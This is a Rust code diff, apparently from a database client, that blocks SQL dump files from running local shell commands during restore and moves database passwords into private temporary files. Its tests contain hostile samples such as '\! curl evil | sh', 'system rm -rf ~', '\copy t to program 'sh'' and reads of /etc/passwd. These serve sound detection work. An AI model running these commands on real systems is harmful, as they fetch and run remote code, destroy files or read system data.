@@ -137,38 +137,108 @@ fn pg_dbname(db: &str) -> String {
     format!("dbname='{}'", db.replace('\\', "\\\\").replace('\'', "\\'"))
 }
 
-/// SQL 파일 안의 클라이언트 명령 중 이 컴퓨터에서 무언가를 하는 것 (psql \! · \o |… · \copy … program · \i, mysql system · tee · pager · source).
-/// COPY … FROM stdin 의 데이터 줄은 보지 않는다. 있으면 그 줄
+/// SQL 파일 안에서 이 컴퓨터에 무언가를 하는 클라이언트 명령 (그 줄). 보조 검사: psql 은 \restrict, mysql 은 --binary-mode 로 끈다.
+/// psql: 문자열 · 주석 · 달러 인용 · COPY 데이터 밖의 \명령 어디든 (\connect · \. · \encoding 만 된다),
+/// mysql: 줄 머리의 system · tee · pager · source · connect … 와 \! · \T · \P · \. · \r
 pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String> {
-    let mut copy = false;
+    if kind == DbKind::Mysql {
+        for line in sql.split(b'\n') {
+            let line = String::from_utf8_lossy(&line.ok()?).into_owned();
+            let t = line.trim_start();
+            let word = t.split_whitespace().next().unwrap_or("").to_lowercase();
+            let bad_word = ["system", "tee", "notee", "pager", "nopager", "source", "connect", "edit"].contains(&word.as_str());
+            let bad_slash = t.strip_prefix('\\').is_some_and(|c| c.starts_with(['!', 'T', 'P', '.', 'r', 'e']));
+            if bad_word || bad_slash || t.contains("\\!") {
+                return Some(line);
+            }
+        }
+        return None;
+    }
+    // PostgreSQL: 바이트 단위로 상태를 따라간다
+    #[derive(PartialEq)]
+    enum St {
+        Code,
+        Single,
+        Double,
+        Dollar(Vec<u8>),
+        Line,
+        Block(u32),
+        Copy,
+    }
+    let mut st = St::Code;
     for line in sql.split(b'\n') {
-        let line = String::from_utf8_lossy(&line.ok()?).into_owned();
-        let line = line.trim_end_matches('\r');
-        let t = line.trim_start();
-        if copy {
-            copy = t != "\\.";
-            continue;
-        }
-        let low = t.to_lowercase();
-        if kind == DbKind::Postgres && low.starts_with("copy ") && low.trim_end().ends_with("from stdin;") {
-            copy = true;
-            continue;
-        }
-        let Some(cmd) = t.strip_prefix('\\') else {
-            if kind == DbKind::Mysql && ["system ", "tee ", "pager ", "source ", "notee", "nopager"].iter().any(|c| low.starts_with(c)) {
-                return Some(line.to_string());
+        let Ok(b) = line else { return Some("(can't read the file)".into()) };
+        let shown = || String::from_utf8_lossy(&b).into_owned();
+        if st == St::Copy {
+            // COPY 데이터는 \. 한 줄로 끝난다
+            if b.trim_ascii() == b"\\." {
+                st = St::Code;
             }
             continue;
-        };
-        let name: String = cmd.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '!' || *c == '.').collect::<String>().to_lowercase();
-        let bad = match kind {
-            DbKind::Postgres => name.starts_with('!') || ["i", "ir", "include", "include_relative", "setenv"].contains(&name.as_str())
-                || (["o", "out", "g", "gx", "w", "write"].contains(&name.as_str()) && cmd.contains('|'))
-                || (name == "copy" && cmd.to_lowercase().contains("program")),
-            _ => name.starts_with('!') || ["t", "p", "."].contains(&name.as_str()),
-        };
-        if bad {
-            return Some(line.to_string());
+        }
+        if st == St::Line {
+            st = St::Code;
+        }
+        let mut i = 0usize;
+        while i < b.len() {
+            let c = b[i];
+            let d = b.get(i + 1).copied().unwrap_or(0);
+            match &st {
+                St::Single if c == b'\'' => st = St::Code,
+                St::Double if c == b'"' => st = St::Code,
+                St::Block(n) if c == b'*' && d == b'/' => {
+                    st = if *n == 1 { St::Code } else { St::Block(n - 1) };
+                    i += 1;
+                }
+                St::Block(n) if c == b'/' && d == b'*' => {
+                    st = St::Block(n + 1);
+                    i += 1;
+                }
+                St::Dollar(tag) if b[i..].starts_with(tag) => {
+                    i += tag.len();
+                    st = St::Code;
+                    continue;
+                }
+                St::Code => match c {
+                    b'\'' => st = St::Single,
+                    b'"' => st = St::Double,
+                    b'-' if d == b'-' => {
+                        st = St::Line;
+                        break;
+                    }
+                    b'/' if d == b'*' => {
+                        st = St::Block(1);
+                        i += 1;
+                    }
+                    b'$' => {
+                        if let Some(e) = b[i + 1..].iter().position(|&x| x == b'$').map(|p| i + 1 + p) {
+                            if std::str::from_utf8(&b[i..=e]).is_ok_and(crate::sql::is_dollar_tag) {
+                                st = St::Dollar(b[i..=e].to_vec());
+                                i = e + 1;
+                                continue;
+                            }
+                        }
+                    }
+                    b'\\' => {
+                        let name: String = b[i + 1..].iter().take_while(|x| x.is_ascii_alphanumeric() || **x == b'!' || **x == b'.' || **x == b'_').map(|&x| x as char).collect::<String>().to_lowercase();
+                        let at_line_start = b[..i].iter().all(|x| x.is_ascii_whitespace());
+                        if !(at_line_start && ["connect", "c", ".", "encoding"].contains(&name.as_str())) {
+                            return Some(shown());
+                        }
+                    }
+                    // COPY … FROM stdin; 다음 줄부터는 데이터 (pg_dump 는 COPY 를 한 줄에 쓴다)
+                    b';' => {
+                        let stmt = String::from_utf8_lossy(&b[..i]).to_lowercase();
+                        if stmt.trim_start().starts_with("copy ") && stmt.trim_end().ends_with("from stdin") {
+                            st = St::Copy;
+                            break;
+                        }
+                    }
+                    _ => {}
+                },
+                _ => {}
+            }
+            i += 1;
         }
     }
     None
@@ -196,6 +266,53 @@ async fn endpoint(st: &AppState, id: &str) -> AppResult<(String, u16, String, St
         None => (cfg.host.clone(), cfg.port),
     };
     Ok((host, port, cfg.user.clone(), db, st.secret(base)?, cfg))
+}
+
+/// psql 이 \restrict 를 아는지 (17.6 · 16.10 · 15.14 · 14.19 · 13.22 부터)
+fn psql_restricts(v: &[u64]) -> bool {
+    let (major, minor) = (v.first().copied().unwrap_or(0), v.get(1).copied().unwrap_or(0));
+    match major {
+        0..=12 => false,
+        13 => minor >= 22,
+        14 => minor >= 19,
+        15 => minor >= 14,
+        16 => minor >= 10,
+        17 => minor >= 6,
+        _ => true,
+    }
+}
+
+/// mysql 이 --system-command 를 아는지 (8.0.40 · 8.4.3 · 9.1 부터)
+fn mysql_has_system_command_option(tool: &Path) -> bool {
+    std::process::Command::new(tool).arg("--help").output().map(|o| String::from_utf8_lossy(&o.stdout).contains("--system-command")).unwrap_or(false)
+}
+
+/// psql 에 넣을 사본 (0600): 예전 서버가 모르는 SET 을 빼고, key 가 있으면 맨 앞에 \restrict key 를 붙이고 파일 안의 \restrict · \unrestrict 는 뺀다
+/// (pg_dump 17.6+ 가 쓰는 줄. 남겨 두면 덤프가 정한 키로 명령을 다시 켤 수 있다)
+fn prepare_psql_input(src: &Path, server: Option<u64>, key: Option<String>) -> AppResult<PathBuf> {
+    use std::io::{BufRead, Write};
+    let drop: Vec<&str> = NEWER_SETTINGS.iter().filter(|(_, v)| server.is_some_and(|s| s < *v)).map(|(n, _)| *n).collect();
+    let out = std::env::temp_dir().join(format!("qurry-restore-{}.sql", uuid::Uuid::new_v4()));
+    let mut r = std::io::BufReader::new(std::fs::File::open(src)?);
+    let mut w = std::io::BufWriter::new(private_file(&out)?);
+    if let Some(k) = &key {
+        writeln!(w, "\\restrict {k}")?;
+    }
+    let mut line = Vec::new();
+    while r.read_until(b'\n', &mut line)? > 0 {
+        let t = line.trim_ascii_start();
+        let restrict_line = key.is_some() && (t.starts_with(b"\\restrict") || t.starts_with(b"\\unrestrict"));
+        let newer = line.starts_with(b"SET ") && drop.iter().any(|d| line.starts_with(d.as_bytes()));
+        if !restrict_line && !newer {
+            w.write_all(&line)?;
+        }
+        line.clear();
+    }
+    if let Some(k) = &key {
+        writeln!(w, "\n\\unrestrict {k}")?;
+    }
+    w.flush()?;
+    Ok(out)
 }
 
 /// 복원할 SQL 에 이 컴퓨터에서 명령을 돌리는 줄이 있으면 멈춘다 (pg_dump · mysqldump 는 그런 줄을 쓰지 않는다)
@@ -269,10 +386,35 @@ async fn run_tool(mut cmd: tokio::process::Command, tool: &str, stdin: Option<&P
 }
 
 /// PG 접속 환경변수 (비밀번호·SSL 은 명령줄에 싣지 않는다)
-fn pg_env(cmd: &mut tokio::process::Command, password: Option<&str>, cfg: &crate::store::ConnectionConfig) {
-    if let Some(p) = password {
-        cmd.env("PGPASSWORD", p);
+/// 도구에 넘기는 비밀번호 파일 (0600, 도구가 끝나면 지운다)
+struct SecretTemp(PathBuf);
+
+impl Drop for SecretTemp {
+    fn drop(&mut self) {
+        let _ = std::fs::remove_file(&self.0);
     }
+}
+
+fn secret_temp(prefix: &str, content: &str) -> AppResult<SecretTemp> {
+    use std::io::Write;
+    let path = std::env::temp_dir().join(format!("{prefix}-{}", uuid::Uuid::new_v4()));
+    let mut f = private_file(&path)?;
+    f.write_all(content.as_bytes())?;
+    Ok(SecretTemp(path))
+}
+
+/// 비밀번호는 환경 변수가 아니라 이 서버 · 사용자에만 맞는 PGPASSFILE 로 (덤프 안의 \connect 가 다른 서버로 가도 따라가지 않는다)
+fn pg_env(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, password: Option<&str>, cfg: &crate::store::ConnectionConfig) -> AppResult<Option<SecretTemp>> {
+    let esc = |s: &str| s.replace('\\', "\\\\").replace(':', "\\:");
+    let pass = match password {
+        Some(p) => {
+            let t = secret_temp("qurry-pgpass", &format!("{}:{port}:*:{}:{}\n", esc(host), esc(user), esc(p)))?;
+            cmd.env("PGPASSFILE", &t.0);
+            Some(t)
+        }
+        None => None,
+    };
+    cmd.env_remove("PGPASSWORD");
     cmd.env("PGCONNECT_TIMEOUT", "10");
     match cfg.active_ssl() {
         Some(s) => {
@@ -287,13 +429,21 @@ fn pg_env(cmd: &mut tokio::process::Command, password: Option<&str>, cfg: &crate
             cmd.env("PGSSLMODE", "prefer");
         }
     }
+    Ok(pass)
 }
 
-fn my_args(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, password: Option<&str>, cfg: &crate::store::ConnectionConfig) {
+/// 비밀번호는 --defaults-extra-file (0600) 로. 이 옵션은 맨 앞이어야 한다
+fn my_args(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, password: Option<&str>, cfg: &crate::store::ConnectionConfig) -> AppResult<Option<SecretTemp>> {
+    let pass = match password {
+        Some(p) => {
+            let t = secret_temp("qurry-my", &format!("[client]\npassword=\"{}\"\n", p.replace('\\', "\\\\").replace('"', "\\\"")))?;
+            cmd.arg(format!("--defaults-extra-file={}", t.0.display()));
+            Some(t)
+        }
+        None => None,
+    };
+    cmd.env_remove("MYSQL_PWD");
     cmd.arg("-h").arg(host).arg("-P").arg(port.to_string()).arg("-u").arg(user).arg("--protocol=TCP");
-    if let Some(p) = password {
-        cmd.env("MYSQL_PWD", p);
-    }
     if let Some(s) = cfg.active_ssl() {
         cmd.arg(format!("--ssl-mode={}", match s.mode() { "verify-full" => "VERIFY_IDENTITY", "verify-ca" => "VERIFY_CA", _ => "REQUIRED" }));
         for (k, v) in [("--ssl-ca", &s.ca_file), ("--ssl-cert", &s.cert_file), ("--ssl-key", &s.key_file)] {
@@ -302,6 +452,7 @@ fn my_args(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str,
             }
         }
     }
+    Ok(pass)
 }
 
 impl AppState {
@@ -327,13 +478,13 @@ impl AppState {
                     for sc in &opts.schemas {
                         cmd.arg("-n").arg(sc);
                     }
-                    pg_env(&mut cmd, password.as_deref(), &cfg);
+                    let _pass = pg_env(&mut cmd, &host, port, &user, password.as_deref(), &cfg)?;
                     run_tool(cmd, "pg_dump", None, None, Some(&file), &job).await?;
                 }
                 DbKind::Mysql => {
                     let tool = find_tool("mysqldump").ok_or_else(|| missing("mysqldump"))?;
                     let mut cmd = tokio::process::Command::new(tool);
-                    my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg);
+                    let _pass = my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg)?;
                     cmd.args(["--single-transaction", "--routines", "--triggers", "--events", "--hex-blob"]);
                     if opts.schema_only {
                         cmd.arg("--no-data");
@@ -396,20 +547,26 @@ impl AppState {
                             cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
                             cmd.args(["--exit-on-error", "--single-transaction"]);
                             cmd.arg(&file);
-                            pg_env(&mut cmd, password.as_deref(), &cfg);
+                            let _pass = pg_env(&mut cmd, &host, port, &user, password.as_deref(), &cfg)?;
                             run_tool(cmd, "pg_restore", None, None, None, &job).await?;
                         }
-                    } else {
-                        refuse_local_commands(&file, DbKind::Postgres)?;
-                        sql_file = strip_newer_settings(&file, server)?;
                     }
                     if !custom || sql_file.is_some() {
-                        let src = sql_file.clone().unwrap_or_else(|| file.clone());
+                        let src0 = sql_file.clone().unwrap_or_else(|| file.clone());
                         let tool = find_tool_for("psql", server).ok_or_else(|| missing("psql"))?;
+                        // psql 명령 (\! · \o · \copy … program · \connect …) 은 \restrict 로 끈다. 그걸 모르는 예전 psql 은 줄을 읽어 본다
+                        let restrict = psql_restricts(&version_of(&tool));
+                        if !restrict {
+                            refuse_local_commands(&src0, DbKind::Postgres)?;
+                        }
+                        let src = prepare_psql_input(&src0, server, restrict.then(|| uuid::Uuid::new_v4().simple().to_string()))?;
+                        if let Some(t) = sql_file.replace(src.clone()) {
+                            std::fs::remove_file(t).ok();
+                        }
                         let mut cmd = tokio::process::Command::new(tool);
                         cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
                         cmd.args(["-X", "-q", "-v", "ON_ERROR_STOP=1", "--single-transaction", "-f", "-"]);
-                        pg_env(&mut cmd, password.as_deref(), &cfg);
+                        let _pass = pg_env(&mut cmd, &host, port, &user, password.as_deref(), &cfg)?;
                         job.total.store(std::fs::metadata(&src).map(|m| m.len()).unwrap_or(size), Ordering::Relaxed);
                         let r = run_tool(cmd, "psql", Some(&src), None, None, &job).await;
                         if let Some(t) = sql_file {
@@ -421,8 +578,14 @@ impl AppState {
                 DbKind::Mysql => {
                     refuse_local_commands(&file, DbKind::Mysql)?;
                     let tool = find_tool("mysql").ok_or_else(|| missing("mysql"))?;
+                    let system_off = mysql_has_system_command_option(&tool);
                     let mut cmd = tokio::process::Command::new(tool);
-                    my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg);
+                    let _pass = my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg)?;
+                    // mysql 클라이언트 명령 (system · tee · pager · source · connect …) 을 끈다 (charset · delimiter 만 남는다)
+                    cmd.arg("--binary-mode");
+                    if system_off {
+                        cmd.arg("--system-command=OFF");
+                    }
                     cmd.arg("--").arg(&db);
                     job.total.store(size, Ordering::Relaxed);
                     run_tool(cmd, "mysql", Some(&file), None, None, &job).await?;
@@ -452,14 +615,33 @@ mod tests {
     #[test]
     fn restore_scripts_with_local_commands_are_refused() {
         use DbKind::{Mysql, Postgres};
-        assert!(local_command("\\connect shop\nSET x = 1;\nCREATE TABLE t (a int);\nCOPY t (a) FROM stdin;\n\\!rm -rf ~\n\\.\n\\restrict abc\n".as_bytes(), Postgres).is_none());
+        assert!(local_command("\\connect shop\nSET x = 1;\nCREATE TABLE t (a int);\nCOPY t (a) FROM stdin;\n\\!rm -rf ~\n\\.\n".as_bytes(), Postgres).is_none());
         for bad in ["\\! curl evil | sh", "  \\o |cat > ~/.zshrc", "\\g |sh", "\\copy t to program 'sh'", "\\i /etc/passwd", "\\setenv PAGER x"] {
             assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
         }
+        // 줄 가운데 · 파이프 없는 파일 쓰기 · 달러 인용으로 COPY 를 흉내 낸 것
+        for bad in ["select 1; \\! id", "select 1 \\g |sh", "\\o ~/.zshrc", "\\w file", "\\copy (select 1) to '/tmp/x'", "\\lo_export 1 /tmp/x", "\\s file",
+            "select $$\ncopy t from stdin;\n$$;\n\\! id\n\\.", "\\restrict k"] {
+            assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
+        }
+        // 문자열 · 달러 인용 · 주석 안의 \ 는 상관없다
+        assert!(local_command("select E'a\\nb', 'x\\y';\n-- \\! not run\ncreate function f() returns text as $f$ select '\\!' $f$ language sql;\ninsert into t values ('line\n\\! inside a string');\n".as_bytes(), Postgres).is_none());
         assert!(local_command("-- MySQL dump\nCREATE TABLE t (a int);\nINSERT INTO t VALUES (1);\n".as_bytes(), Mysql).is_none());
-        for bad in ["system rm -rf ~", "\\! id", "tee /Users/x/.zshrc", "\\T /tmp/x", "pager sh", "source /etc/passwd"] {
+        for bad in ["system rm -rf ~", "system\tid", "\\! id", "tee /Users/x/.zshrc", "\\T /tmp/x", "pager sh", "source /etc/passwd", "connect db evil.host"] {
             assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Mysql).is_some(), "{bad}");
         }
+    }
+
+    /// psql 입력 사본: 맨 앞 \restrict 키, 파일 안의 \restrict · \unrestrict 는 빼고, 0600
+    #[test]
+    fn psql_input_is_restricted() {
+        assert!(psql_restricts(&[17, 6]) && psql_restricts(&[16, 10]) && psql_restricts(&[18, 0]) && !psql_restricts(&[16, 9]) && !psql_restricts(&[12, 22]));
+        let src = std::env::temp_dir().join(format!("qurry-in-{}.sql", uuid::Uuid::new_v4()));
+        std::fs::write(&src, "\\restrict theirs\nSET transaction_timeout = 0;\nCREATE TABLE t (a int);\n\\unrestrict theirs\n").unwrap();
+        let out = prepare_psql_input(&src, Some(16), Some("k1".into())).unwrap();
+        assert_eq!(std::fs::read_to_string(&out).unwrap(), "\\restrict k1\nCREATE TABLE t (a int);\n\n\\unrestrict k1\n");
+        std::fs::remove_file(src).ok();
+        std::fs::remove_file(out).ok();
     }
 
     #[cfg(unix)]
